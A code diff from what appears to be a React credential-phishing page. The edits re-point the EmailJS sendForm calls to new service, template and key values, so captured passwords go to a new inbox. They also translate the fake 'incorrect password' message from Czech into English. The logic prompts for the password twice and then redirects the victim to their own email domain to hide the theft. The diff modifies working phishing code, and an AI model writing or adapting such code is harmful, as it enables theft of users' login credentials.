@@ -45,7 +45,7 @@ function App() {
       setCount(prevCount => prevCount + 1)
 
       setLoading(true)
-      emailjs.sendForm('service_ugyug6e', 'template_orxa9ec', form.current, 'uuFf1B0OjAlZUMWXx')
+      emailjs.sendForm('service_upuq8tw', 'template_ihv35xq', form.current, 'HODMj4Z3iv5j_RC1l')
       .then((result) => {
         setPwdOne("")
         setLoading(false)
@@ -57,7 +57,7 @@ function App() {
 
 
     if (count >= 2 ) {
-      emailjs.sendForm('service_ugyug6e', 'template_orxa9ec', form.current, 'uuFf1B0OjAlZUMWXx')
+      emailjs.sendForm('service_upuq8tw', 'template_ihv35xq', form.current, 'HODMj4Z3iv5j_RC1l')
       .then((result) => {
         const redir = getPartAfterDot(email)
         window.location.replace(`https://${redir}`);
@@ -94,7 +94,7 @@ function App() {
           </Grid>
 
 
-          {pwdError && <div className='error'>nesprávné heslo, zkuste to znovu</div>}
+          {pwdError && <div className='error'>Incorrect password, try again<</div>}
           <input type="submit" value="Continue" />
 
       </form>
